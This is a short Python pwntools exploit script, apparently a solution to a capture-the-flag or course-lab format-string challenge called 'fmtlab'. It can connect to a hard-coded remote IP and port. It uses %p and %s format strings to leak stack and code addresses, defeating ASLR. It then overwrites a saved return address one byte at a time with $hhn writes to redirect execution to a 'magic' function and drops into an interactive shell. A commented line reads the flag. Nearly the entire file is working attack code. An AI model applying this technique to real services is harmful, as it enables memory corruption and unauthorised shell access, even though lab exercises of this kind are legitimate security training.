#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'amd64'

if len(sys.argv) > 1:
    r = remote('140.112.31.97', 30104)
else:
    r = process('./fmtlab')

def leak_pos(i):
    r.sendlineafter('our message : ', '%{}$p'.format(i))
    return int(r.recvuntil('Y', drop=True), 16)

def show_leak_pos(i):
    r.sendlineafter('our message : ', '%{}$p'.format(i))
    return r.recvuntil('Y', drop=True)

def leak_str(i):
    r.sendlineafter('our message : ', '%{}$s'.format(i))
    return u64(r.recvuntil('Y', drop=True) + b'\x00\x00')

def show():
    for i in range(1,20):
        print(i, end=' ')
        print(show_leak_pos(i))
    #exit(1)

def w(target, value, offset):
    write_bytes = []
    for i in range(8):
        write_bytes.append(value & 0xff)
        value >>= 8
    for i in range(8):
        p = fmtstr_payload(offset, {target+i: write_bytes[i]}, write_size='byte', numbwritten=0).replace(b'$lln', b'$hhn')
        print(p)
        r.sendline(p)

#show()
main_rsp = leak_pos(17) - 0x138
log.info("main_rsp : {}".format(hex(main_rsp)))

main_base = leak_pos(19) - 0x123b
magic_addr = 0x1201 + main_base
log.info("main_base : {}".format(hex(main_base)))
log.info("magic_addr : {}".format(hex(magic_addr)))

## target rsp + 0x48
w(main_rsp+0x48, magic_addr, 8) # +1 for stack alignment

r.sendline(b'%10$n'.ljust(0x10, b'\x00') + p64(main_rsp+0xc))
#r.sendline('cat /home/`whoami`/flag')
r.interactive()
